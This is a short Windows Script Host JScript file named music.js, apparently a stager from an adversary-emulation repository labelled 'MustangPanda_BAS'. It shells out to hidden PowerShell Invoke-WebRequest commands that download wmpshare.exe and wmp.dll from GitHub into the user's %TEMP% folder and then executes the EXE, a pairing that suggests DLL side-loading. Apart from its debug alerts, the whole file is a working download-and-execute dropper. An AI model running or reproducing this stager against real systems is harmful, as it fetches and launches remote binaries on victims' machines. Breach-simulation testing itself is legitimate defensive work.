// music.js - Download EXE + DLL using PowerShell (More Reliable)

alert("✅ music.js loaded from GitHub!");

try {
    var shell = new ActiveXObject("WScript.Shell");
    var temp = shell.ExpandEnvironmentStrings("%TEMP%");

    alert("Temp folder: " + temp);

    // Download Microsoft_DNX.exe
    var cmd1 = 'powershell -NoProfile -Command "Invoke-WebRequest -Uri \'https://raw.githubusercontent.com/bas07-hub/MustangPanda_BAS/main/wmpshare.exe\' -OutFile \'' + temp + '\\wmpshare.exe\'"';
    shell.Run(cmd1, 0, true);

    // Download legit.dll
    var cmd2 = 'powershell -NoProfile -Command "Invoke-WebRequest -Uri \'https://raw.githubusercontent.com/bas07-hub/MustangPanda_BAS/main/wmp.dll\' -OutFile \'' + temp + '\\wmp.dll\'"';
    shell.Run(cmd2, 0, true);

    alert("✅ Files downloaded and saved to Temp folder!");

    // Execute the EXE
    shell.Run('"' + temp + '\\wmpshare.exe"', 1, false);

    alert("✅ Executable launched!");

} catch(e) {
    alert("Error: " + e.message);
}
